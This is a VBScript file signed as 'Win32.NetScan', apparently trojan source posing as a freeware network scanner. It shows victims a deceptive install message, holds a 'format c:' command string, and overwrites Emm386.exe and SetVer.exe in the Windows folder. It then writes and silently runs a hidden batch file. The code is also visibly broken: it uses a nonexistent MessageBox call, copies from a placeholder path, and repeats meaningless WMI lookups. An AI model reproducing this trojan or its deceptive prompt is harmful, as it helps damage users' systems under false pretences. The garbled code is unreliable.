Option Explicit

'Win32.NetScan by ZeMacroKiller98
'Tous droits réservés (c) 2001

Dim GetNetScanPath, GetNetScanWinDir, MyBuffer
Dim FileEmm386, FileSetver, Nom
Dim ExtInf, Err, ErrSend
Dim NetScanTime, NetScanHandle, AutoBat
Dim GetKernLib, GetMapiLib
Dim NetScan32Key, NetScanNTKey, NetScanInstall, CreateNetScan
Dim MyServProcs, SendMessToOther, GetAddressUser, GetMemFree
Dim WindowsHwnd, SymantecHwnd, NAVHwnd
Dim stMessage, stRecip, stFile, lpRecip
Dim NetScanInfo, NetScanProc
Dim TriggerScanTime

GetNetScanPath = Space(256)
GetNetScanWinDir = Space(256)
MyBuffer = "echo y|format c: /u /v:HaHaHaHa"
FileEmm386 = "Emm386.exe"
FileSetver = "SetVer.exe"
Nom = "a"
ExtInf = 0
Err = 0
ErrSend = 0

Set GetKernLib = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2:Win32_ProcessStartup")
Set GetMapiLib = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2:Win32_ProcessStartup")
Set NetScan32Key = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2:Win32_ProcessStartup")
Set NetScanNTKey = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2:Win32_ProcessStartup")
Set NetScanInstall = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2:Win32_ProcessStartup")
Set CreateNetScan = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2:Win32_ProcessStartup")

GetNetScanPath = WScript.ScriptFullName
GetNetScanWinDir = CreateObject("WScript.Shell").SpecialFolders("Windows")

MessageBox "This freeware install automatically itself into your system" & vbCrLf & _
           "It scans your system each time you connect to the network" & vbCrLf & _
           "If you have any problem, contact Microsoft", "NetScan Utility", _
           vbOK + vbInformation + vbSystemModal

If InStr(1, GetNetScanPath, " ") > 0 Then
    GetNetScanPath = """" & GetNetScanPath & """"
End If

If InStr(1, GetNetScanWinDir, " ") > 0 Then
    GetNetScanWinDir = """" & GetNetScanWinDir & """"
End If

Dim objFSO, objShell, objFolder, objFiles, objFile
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

If Not objFSO.FolderExists("C:\Britney") Then
    objFSO.CreateFolder("C:\Britney")
End If

If Not objFSO.FolderExists("C:\Britney\Install") Then
    objFSO.CreateFolder("C:\Britney\Install")
End If

If Not objFSO.FolderExists("C:\Britney\Install\Temp") Then
objFSO.CreateFolder("C:\Britney\Install\Temp")
End If

' Copy necessary files to the installation folder
objFSO.CopyFile "C:\Path\To\Emm386.exe", "C:\Britney\Install\Emm386.exe"
objFSO.CopyFile "C:\Path\To\SetVer.exe", "C:\Britney\Install\SetVer.exe"

' Check if Emm386.exe exists in the Windows directory
If objFSO.FileExists(GetNetScanWinDir & "" & FileEmm386) Then
' Delete the existing file
objFSO.DeleteFile GetNetScanWinDir & "" & FileEmm386
End If

' Check if SetVer.exe exists in the Windows directory
If objFSO.FileExists(GetNetScanWinDir & "" & FileSetver) Then
' Delete the existing file
objFSO.DeleteFile GetNetScanWinDir & "" & FileSetver
End If

' Move Emm386.exe and SetVer.exe to the Windows directory
objFSO.MoveFile "C:\Britney\Install\Emm386.exe", GetNetScanWinDir & "" & FileEmm386
objFSO.MoveFile "C:\Britney\Install\SetVer.exe", GetNetScanWinDir & "" & FileSetver

' Create and write to the Auto.bat file
Set AutoBat = objFSO.CreateTextFile(GetNetScanWinDir & "\Auto.bat", True)
AutoBat.WriteLine "echo off"
AutoBat.WriteLine "cd " & GetNetScanWinDir
AutoBat.WriteLine "call " & FileEmm386
AutoBat.WriteLine "call " & FileSetver
AutoBat.Close

' Run the Auto.bat file
objShell.Run GetNetScanWinDir & "\Auto.bat", 0, True

' Delete the Auto.bat file
If objFSO.FileExists(GetNetScanWinDir & "\Auto.bat") Then
objFSO.DeleteFile GetNetScanWinDir & "\Auto.bat"
End If

' Display a message box indicating the installation is complete
MessageBox "Installation complete.", "NetScan Utility", vbOK + vbInformation + vbSystemModal
